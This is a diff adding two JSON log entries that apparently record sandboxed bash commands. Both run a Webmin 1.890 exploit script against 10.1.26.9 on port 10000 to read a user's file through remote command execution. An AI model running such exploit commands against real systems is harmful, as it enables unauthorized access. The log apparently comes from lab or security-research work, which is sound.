@@ -1,0 +1,2 @@
+{"sandbox_id": "123", "timestamp_str": "2021-06-30T06:54:05.297Z", "cmd_type": "bash-command", "cmd": "python3 webmin-1.890_exploit.py 10.1.26.9 10000 cat /home/chong/READ-ME.txt"}
+{"sandbox_id": "123", "timestamp_str": "2021-06-30T06:54:13.915Z", "cmd_type": "bash-command", "cmd": "python3 webmin-1.890_exploit.py 10.1.26.9 10000 'cat /home/chong/READ-ME.txt'"}
